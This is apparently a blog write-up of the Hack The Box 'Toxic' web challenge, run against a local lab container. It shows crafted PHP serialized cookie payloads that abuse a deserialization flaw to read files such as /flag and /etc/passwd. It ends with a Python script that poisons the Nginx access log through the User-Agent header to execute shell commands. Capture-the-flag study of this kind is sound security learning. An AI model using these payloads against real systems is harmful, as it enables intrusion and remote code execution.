+++
title = "Hack The Box - Toxic"
tags = [
    "ctf"
]
date = "2022-09-15"
toc = true
+++

# Premise

`Toxic` is another whitebox `Web` challenge from HackTheBox, and presents itself as a web page about the Dart Frog. The goal here is to find a way to retrieve the flag from the web server, using what appears to be a non-interactive webpage.

# Captain Crunch hurts my mouth

Since this is a whitebox challenge, we're given the source code to review, and a local container that we can play with if so inclined.

The HTML of the website seems pretty basic, but there's some interesting stuff in the PHP:

```
if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

PageModel.php is braindead and just serves up whatever the `PHPSESSID` cookie contains:

```
<?php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
```

Looks like we'll need to provide our own `PHPSESSID` cookie with a serialized page request out to the flag. We can see that the one we get is a `base64` encoded string of `O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}`, so let's try to modify that and re-encode it.

Let's start by base64 encoding the above string, but with the last bit changed to `/flag` - `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL2ZsYWciO30g`.

This threw an error to start:

```
2022/07/31 18:10:27 [error] 17#17: *13 FastCGI sent in stderr: "PHP message: PHP Notice:  unserialize(): Error at offset 32 of 45 bytes in /www/index.php on line 24PHP message: PHP Notice:  Undefined property: PageModel::$file in /www/models/PageModel.php on line 8PHP message: PHP Warning:  include(): Filename cannot be empty in /www/models/PageModel.php on line 8PHP message: PHP Warning:  include(): Failed opening '' for inclusion (include_path='.:/usr/share/php7') in /www/models/PageModel.php on line 8" while reading response header from upstream, client: 172.17.0.1, server: _, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php-fpm.sock:", host: "localhost:1337"
```

Let's keep playing. This says that $file is empty/undefined. I think this is because we didn't encode the string properly. Need to update the second `s` to note the proper length of the string, e.g.:

```
O:9:"PageModel":1:{s:4:"file";s:5:"/flag";}
```

This gives us `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czo1OiIvZmxhZyI7fQ==`

This properly gives us the value, but still an error:

```
2022/07/31 18:12:56 [error] 17#17: *15 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/flag): failed to open stream: No such file or directory in /www/models/PageModel.php on line 8PHP message: PHP Warning:  include(): Failed opening '/flag' for inclusion (include_path='.:/usr/share/php7') in /www/models/PageModel.php on line 8" while reading response header from upstream, client: 172.17.0.1, server: _, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php-fpm.sock:", host: "localhost:1337"
```

The paths are absolute, as we can see with the original. Hmm... I must be missing something simple. 

# Narrator: "He was missing something simple"

Aha! I had missed that the flag name gets randomized by `entrypoint.sh`:

```
mv /flag /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1`
```

It's only 5 chars and alphanum so we could bruteforce this, but there must be an easier way. Copying the file manually to `/flag` we can confirm that the approach of just putting the filename in there is sound - likewise trying to retrieve `/etc/passwd`. At this point we have two ways to try to solve this challenge:

1. Brute force the flag filename... 5^62 complexity though. Maybe not...
2. Find another way to figure out what the flag's full filename is.

# Ah, that's why it's called Toxic...

Ok, the smarter path here is a technique called `log poisoning`. Since we know we can retrieve any file, we can probably get our webserver logs, too. 

We can see, since we have a local copy of this challenge running, that Nginx will log a few things we send to it in its `access.log`. One of these things is the `USER_AGENT` header. As luck would have it, we can set the `USER_AGENT` string to something that would be interpreted as a PHP file and basically have full RCE here (including shell access, if we wanted):

```
import requests
import base64

cookie_payload = 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}'
cookie_payload_bytes = cookie_payload.encode('ascii')
cookie_payload_base64_bytes = base64.b64encode(cookie_payload_bytes)
cookie_payload_message = cookie_payload_base64_bytes.decode('ascii')
cookies = {'PHPSESSID': cookie_payload_message}
header_payload = "<?php system('ls -l /');?>"
headers = {'User-Agent': header_payload}

url = "http://localhost:1337"

response = requests.get(url, cookies=cookies, headers=headers)
print(response.text)
```

This will dump the Nginx `access.log` (since we know the path) and thanks to the log poisoning via `USER_AGENT` header we'll be able to get the filename of our target flag. Note that you may need to run this twice since the first hit won't have dumped the output in to the log yet.

Use this filename to update either the `USER_AGENT` header payload to `cat` out the flag, or use the `PHPSESSID` cookie that we were originally playing with to just retrieve it directly, and you're done!

GG!
